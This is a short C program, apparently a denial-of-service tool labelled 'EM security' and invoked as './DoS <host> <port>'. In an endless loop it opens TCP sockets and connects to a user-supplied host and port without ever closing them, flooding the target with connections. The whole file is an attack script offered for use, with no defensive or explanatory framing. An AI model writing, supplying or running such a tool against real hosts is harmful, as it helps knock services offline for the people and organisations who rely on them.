#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){
	
	if(argc < 3){
	
		printf("******** EM security ********\n");
		printf("usage ./DoS <host> <port>\n");	
	
	}
	else{
		while (1){
			int my_socket;
			int connection;

			struct sockaddr_in target;

			my_socket = socket(AF_INET,SOCK_STREAM,0);
			target.sin_family = AF_INET;
			target.sin_port = htons(atoi(argv[2]));
			target.sin_addr.s_addr = inet_addr(argv[1]);
	
	
			connection = connect(my_socket, (struct sockaddr *)&target, sizeof target);
		
			if (connection == 0){
				printf("connection in ip -> %s in port %s \n", argv[1], argv[2]);
			}else{
				printf("impossible to reach the host!\n");
		} 
	}	
}
}

